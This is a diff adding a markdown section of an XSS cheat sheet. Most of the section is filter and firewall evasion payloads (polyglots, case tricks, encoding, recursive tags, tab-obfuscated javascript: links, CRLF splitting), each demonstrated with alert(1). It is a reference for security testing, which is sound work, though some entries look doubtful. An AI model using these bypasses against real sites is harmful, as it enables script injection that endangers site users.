@@ -1,0 +1,58 @@
+### **Tips**
+- Manual detection is difficult; use tools like:
+  - **Burp Suite PRO**
+  - **[RA2 DOM XSS Scanner](https://github.com/dpnishant/ra2-dom-xss-scanner)**
+
+### **Video References**
+- [Understanding DOM XSS](https://www.youtube.com/watch?v=gBqzzhgHoYg)
+
+---
+
+## **5. XSS Filter Evasion Techniques**
+### **General Bypass Techniques**
+- Replace `<` and `>` with **HTML entities**:
+  ```html
+  &lt;script&gt;alert(1)&lt;/script&gt;
+  ```
+- Use **XSS polyglots**:
+  ```html
+  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+  ```
+  - [Full XSS Polyglots List](https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626)
+
+### **XSS Firewall Bypass**
+- **Bypass lowercase filtering**:
+  ```html
+  <scRipT>alert(1)</scRipT>
+  ```
+- **Break firewall regex using new lines**:
+  ```html
+  <script>%0alert(1)</script>
+  ```
+- **Double Encoding**:
+  ```plaintext
+  %2522
+  ```
+- **Recursive filters bypass**:
+  ```html
+  <src<script>ipt>alert(1);</scr</script>ipt>
+  ```
+- **Injecting anchor tags without whitespace**:
+  ```html
+  <a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;">
+  ```
+- **Bypassing whitespace filtering using a bullet (`•`)**:
+  ```html
+  <svg•onload=alert(1)>
+  ```
+- **Changing request methods**:
+  ```
+  GET /?q=xss  
+  POST / q=xss
+  ```
+- **Injecting CRLF characters for HTTP response splitting**:
+  ```
+  GET /%0A%0DValue=%20Virus
+  ```
+
+---
